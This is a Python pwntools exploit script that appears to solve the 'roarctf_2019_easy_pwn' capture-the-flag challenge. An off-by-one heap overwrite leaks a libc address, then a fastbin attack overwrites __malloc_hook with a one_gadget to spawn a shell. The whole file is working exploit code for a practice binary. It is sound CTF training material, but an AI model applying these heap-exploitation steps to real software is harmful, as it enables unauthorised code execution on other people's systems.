#! /usr/bin/python


from pwn import *
from LibcSearcher import *

#p = remote('node3.buuoj.cn',25630)
p = process('./roarctf_2019_easy_pwn')
elf = ELF('./roarctf_2019_easy_pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level = 'debug'

def menu(choice):
	p.recvuntil('choice: ')
	p.sendline(str(choice))

def add(size):
	menu(1)
	p.recvuntil('size: ')
	p.sendline(str(size))

def write(idx,size,content):
	menu(2)
	p.recvuntil('index: ')
	p.sendline(str(idx))
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('content: ')
	p.sendline(content)

def drop(idx):
	menu(3)
	p.recvuntil('index: ')
	p.sendline(str(idx))

def show(idx):
	menu(4)
	p.recvuntil('index: ')
	p.sendline(str(idx))

###leak libc###
add(0x28)#0
add(0x28)#1
add(0x28)#2
add(0x60)#3
add(0x60)#4

payload = 'A' * 0x20 + p64(0) + '\xd1'
write(0,(0x28+10),payload)
drop(1)
add(0x28)#1

show(2)
main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88
libc_base = main_arena - 0x3c4b20
success('libc base:'+hex(libc_base))

###fastbin attack###
malloc_hook = libc_base + libc.symbols['__malloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
fake_chunk = malloc_hook - 0x23
one_gadget = libc_base + 0xf02a4

drop(3)
add(0x90)
p.recvuntil('the index of ticket is ')
index = p.recv(1)
payload = 'A' * 0x20 + p64(0) + p64(0x71) + p64(fake_chunk)
write(index,len(payload),payload)

add(0x60)
add(0x60)
p.recvuntil('the index of ticket is ')
index = p.recv(1)
payload = 'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc+5)
#payload = 'A' * 0x13 + p64(one_gadget)
write(index,len(payload),payload)

###get shell###
success(hex(one_gadget))
#gdb.attach(p)
p.interactive()
